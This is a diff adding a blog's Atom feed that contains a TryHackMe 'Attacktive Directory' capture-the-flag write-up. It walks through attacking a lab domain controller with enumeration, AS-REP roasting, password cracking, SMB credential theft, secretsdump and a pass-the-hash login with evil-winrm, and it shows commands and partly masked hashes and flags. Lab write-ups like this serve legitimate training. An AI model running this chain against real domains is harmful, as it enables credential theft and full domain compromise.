@@ -1,0 +1,194 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+    <title>Writups - attacktive directory</title>
+    <subtitle>A diary dedicated to exploring the world of cybersecurity and technology.</subtitle>
+    <link href="https://theanxiuser.github.io/writups/tags/attacktive-directory/atom.xml" rel="self" type="application/atom+xml"/>
+    <link href="https://theanxiuser.github.io/writups"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2024-10-23T00:00:00+00:00</updated>
+    <id>https://theanxiuser.github.io/writups/tags/attacktive-directory/atom.xml</id>
+    <entry xml:lang="en">
+        <title>Attacktive Directory - TryHackMe Writup</title>
+        <published>2024-10-23T00:00:00+00:00</published>
+        <updated>2024-10-23T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://theanxiuser.github.io/writups/chapters/attacktive-directory/" type="text/html"/>
+        <id>https://theanxiuser.github.io/writups/chapters/attacktive-directory/</id>
+        
+        <content type="html">&lt;div style=&quot;display: flex; align-items: center;&quot;&gt;
+  &lt;div&gt;
+	&lt;img src=&quot;attacktive_directory.png&quot; alt=&quot;Attacktive Directory&quot; width=&quot;100&quot;&#x2F;&gt;
+  &lt;&#x2F;div&gt;
+  &lt;div style=&quot;margin-left: 10px;&quot;&gt;
+	&lt;i&gt;99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?&lt;&#x2F;i&gt;
+  &lt;&#x2F;div&gt;
+&lt;&#x2F;div&gt;
+&lt;h1 id=&quot;scanning&quot;&gt;Scanning&lt;&#x2F;h1&gt;
+&lt;p&gt;Target IP: 10.10.186.106&lt;&#x2F;p&gt;
+&lt;p&gt;The result of nmap scan is &lt;&#x2F;p&gt;
+&lt;pre&gt;
+&gt; nmap -sV 110.10.186.106 -v
+......
+Host is up (0.17s latency).
+Not shown: 986 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+53&#x2F;tcp   open  domain        Simple DNS Plus
+80&#x2F;tcp   open  http          Microsoft IIS httpd 10.0
+88&#x2F;tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-16 15:07:06Z)
+135&#x2F;tcp  open  msrpc         Microsoft Windows RPC
+139&#x2F;tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389&#x2F;tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+445&#x2F;tcp  open  microsoft-ds?
+464&#x2F;tcp  open  kpasswd5?
+593&#x2F;tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636&#x2F;tcp  open  tcpwrapped
+3268&#x2F;tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+3269&#x2F;tcp open  tcpwrapped
+3389&#x2F;tcp open  ms-wbt-server Microsoft Terminal Services
+5985&#x2F;tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)
+Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows
+&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;code&gt;enum4linux&lt;&#x2F;code&gt; is used for the enumeration of port 139&#x2F;445&lt;&#x2F;p&gt;
+&lt;p&gt;The result is&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ enum4linux -a 10.10.186.106
+Starting enum4linux v0.9.1 ( http:&#x2F;&#x2F;labs.portcullis.co.uk&#x2F;application&#x2F;enum4linux&#x2F; ) on Thu Oct 17 07:48:03 2024
+
+ =========================================( Target Information )=========================================
+
+Target ........... 10.10.186.106
+RID Range ........ 500-550,1000-1050
+Username ......... &#x27;&#x27;
+Password ......... &#x27;&#x27;
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ===========================( Enumerating Workgroup&#x2F;Domain on 10.10.186.106 )===========================
+.....
+[E] Can&#x27;t find workgroup&#x2F;domain
+
+ ===============================( Nbtstat Information for 10.10.186.106 )===============================
+
+Can&#x27;t load &#x2F;etc&#x2F;samba&#x2F;smb.conf - run testparm to debug it
+Looking up status of 10.10.186.106
+No reply from 10.10.186.106
+
+ ===================================( Session Check on 10.10.186.106 )===================================
+
+
+[+] Server 10.10.186.106 allows sessions using username &#x27;&#x27;, password &#x27;&#x27;
+
+
+ ================================( Getting domain SID for 10.10.186.106 )================================
+
+Can&#x27;t load &#x2F;etc&#x2F;samba&#x2F;smb.conf - run testparm to debug it
+Domain Name: THM-AD
+Domain Sid: S-1-5-21-3591857110-2884097990-301047963
+
+[+] Host is part of a domain (not a workgroup)
+......
+ =================================( Share Enumeration on 10.10.186.106 )=================================
+
+Can&#x27;t load &#x2F;etc&#x2F;samba&#x2F;smb.conf - run testparm to debug it
+
+	Sharename       Type      Comment
+	---------       ----      -------
+SMB1 disabled -- no workgroup available
+
+[+] Attempting to map shares on 10.10.186.106
+......
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Here we got the NETBIOS domain name. Also &lt;code&gt;.local&lt;&#x2F;code&gt; is the invalid TLD most of the people use for AD,. The same is shown in this case too.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;enumerating-users-via-kerberos&quot;&gt;Enumerating Users via Kerberos&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;code&gt;kerbrute&lt;&#x2F;code&gt; tool is used here. &lt;code&gt;userenum&lt;&#x2F;code&gt; is used to enumerate username. To run the command we need to setup domain name, so append this line in &lt;code&gt;&#x2F;etc&#x2F;hosts&lt;&#x2F;code&gt;. Userlist should be the provided one.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;10.10.186.106 spookysec.local&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Now runnning the command &lt;code&gt;kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt&lt;&#x2F;code&gt; we are getting valid usernames. The answer are already there.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;abusing-kerberos&quot;&gt;Abusing Kerberos&lt;&#x2F;h2&gt;
+&lt;p&gt;The two account here mentioned are already found in above task. The result of above command for one of them is like 
+&lt;code&gt;2024&#x2F;10&#x2F;17 08:12:33 &amp;gt;  [+] svc-***** has no pre auth required. Dumping hash to crack offline:&lt;&#x2F;code&gt; and this is the answer we need.&lt;&#x2F;p&gt;
+&lt;p&gt;Now running &lt;code&gt;GetNPUsers.py&lt;&#x2F;code&gt; tool of impacket to reterive information about the user. This is TGT, and this is already we have. The result is like&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ &#x2F;opt&#x2F;impacket&#x2F;examples&#x2F;GetNPUsers.py spookysec.local&#x2F;svc-admin
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:
+[*] Cannot authenticate svc-admin, getting its TGT
+&#x2F;opt&#x2F;impacket&#x2F;examples&#x2F;GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+$krb5asrep$23$svc-*****@SPOOKYSEC.LOCAL:279edbdaf153fbd3c5e418fd97266821$3efe8c8212644d80f88de5f5e93b09ff8834c57ff88fcbc77d7f50a67073623623c247fe17c9d90.......
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Locking into the hash, we got name and mode. The mode is needed to crack the hash using &lt;code&gt;hashcat&lt;&#x2F;code&gt; but for &lt;code&gt;john&lt;&#x2F;code&gt; mode is not needed. In this case we are using john.&lt;&#x2F;p&gt;
+&lt;p&gt;Here we got the password as&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ john svc-admin.hash --wordlist=passwordlist.txt
+.....
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+mana**********   ($krb5asrep$23$svc-*****@SPOOKYSEC.LOCAL)
+1g 0:00:00:00 DONE (2024-10-17 08:33) 2.325g&#x2F;s 16669p&#x2F;s 16669c&#x2F;s 16669C&#x2F;s horoscope..frida
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;back-to-the-basics&quot;&gt;Back to the Basics&lt;&#x2F;h2&gt;
+&lt;p&gt;Here we got the shares&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ smbclient -L 10.10.186.106 --user svc-*****
+Can&#x27;t load &#x2F;etc&#x2F;samba&#x2F;smb.conf - run testparm to debug it
+Password for [WORKGROUP\svc-admin]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	backup          Disk      
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Now connecting with backup share. We got something special. Download and acess this file as&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ smbclient \\\\10.10.186.106\\backup --user svc-***** --password mana**********
+Can&#x27;t load &#x2F;etc&#x2F;samba&#x2F;smb.conf - run testparm to debug it
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sun Apr  5 00:53:39 2020
+  ..                                  D        0  Sun Apr  5 00:53:39 2020
+  backup_credentials.txt              A       48  Sun Apr  5 00:53:53 2020
+
+		8247551 blocks of size 4096. 3631513 blocks available
+smb: \&gt; get backup_credentials.txt
+getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes&#x2F;sec) (average 0.1 KiloBytes&#x2F;sec)
+&lt;&#x2F;pre&gt;
+&lt;p&gt;There is a cipher. THis is encoded into base 64, decoding it.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ base64 -d backup_credentials.txt
+backup@spookysec.local:backu******** 
+&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;elevating-privileges-within-the-domain&quot;&gt;Elevating Privileges within the Domain&lt;&#x2F;h2&gt;
+&lt;p&gt;We are using &lt;code&gt;secretsdump.py&lt;&#x2F;code&gt; here and the above domain controller. Password is required and this is already with us by decoding above cipher.&lt;&#x2F;p&gt;
+&lt;p&gt;The command to run is &lt;code&gt;.&#x2F;secretsdump.py -just-dc backup@spookysec.local&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Now we have all the answer to the question mentioned here. Also there is a method of attack called &lt;code&gt;Pass The Hash&lt;&#x2F;code&gt;, which allow us to authenticate as user without password and we have all the hashes so good to go.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;flag-submission-panel&quot;&gt;Flag Submission Panel&lt;&#x2F;h2&gt;
+&lt;p&gt;Now need to logged in using hash for different user, mentioned there to get and submit flag using tool &lt;code&gt;Evil-WinRM&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;User to try are &lt;code&gt;svc-admin&lt;&#x2F;code&gt;, &lt;code&gt;backup&lt;&#x2F;code&gt; and &lt;code&gt;Administrator&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;We are connected via Administrator using &lt;code&gt;evil-winrm -i 10.10.186.106 -u Administrator -H 0e0363213e37b9**********b0bcb4fc&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The flags are as &lt;&#x2F;p&gt;
+&lt;pre&gt;
+*Evil-WinRM* PS C:\Users\svc-admin\Desktop&gt; cat user.txt.txt
+TryHackMe{K3rb3r0**********}
+
+*Evil-WinRM* PS C:\Users\backup\Desktop&gt; cat PrivEsc.txt
+TryHackMe{B4ckM**********}
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
+TryHackMe{4ctiveD1rec**********}
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Now we have completed the task, this was the hacking of domain controller.&lt;&#x2F;p&gt;
+&lt;p&gt;Happy Hacking !!&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+</feed>
